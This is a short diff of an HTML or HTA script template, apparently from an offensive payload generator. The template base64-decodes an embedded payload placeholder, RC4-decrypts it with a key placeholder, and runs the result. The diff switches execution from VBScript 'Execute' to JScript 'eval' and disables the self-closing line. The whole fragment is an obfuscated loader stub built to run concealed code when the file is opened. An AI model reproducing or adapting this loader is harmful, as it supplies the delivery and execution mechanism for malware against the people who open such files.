@@ -41,9 +41,9 @@ var b64block = "%B64PAYLOAD%";
 var decoded = decodeBase64(b64block);
 var plain = rc4(%KEY%, decoded);
 </script>
-<script language="vbscript" >
-Execute plain
-self.close
+<script language="JScript" >
+eval(plain);
+//self.close();
 </script>
 </body>
 </html>
